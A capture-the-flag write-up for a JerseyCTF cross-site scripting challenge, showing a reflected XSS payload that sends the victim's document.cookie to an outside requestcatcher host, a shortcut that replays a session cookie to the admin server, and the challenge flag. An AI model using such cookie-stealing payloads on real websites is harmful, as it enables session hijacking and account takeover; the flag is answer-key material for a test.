# xss-terminator
### Description
> The Terminator told you to put the cookie down, and you didn't listen. Now he is very angry! You must find a way to steal the cookie from the vulnerable website and send it to the evil server where the Terminator is waiting... just don't make him wait too long.

### This is simple XSS challenge

Here there is an input and write the xss payload,

![](https://i.imgur.com/RgW3XOp.png)

Now simply use the payload from (https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) and you will get the flag:

payload: `http://198.211.99.71:3000/?q=%3Cimg%20src%3dx%20onerror%3dthis.src%3d%27https://jerseyctf23.requestcatcher.com/?c%3d%27+document.cookie%3E`

But hey, this challenge is broken and we can get flag directly from our cookie too. So directly go to `console`, grab to cookie and send the request to admin server like this,
`http://198.211.99.71:3001/cookie?data=connect.sid=s%3AhTlE8O9IWFxVt6uVkCIbcaDQKVLX5eBP.IezMDe6bR6Gl0arr4kUu%2FUq7PKtl9oMDixpMflapJEU`

You will get `Thanks` as response, then go back to main page in admin server and reload, you will get the flag.

Flag: `jctf{who_said_you_could_open_the_cookie_jar!?}`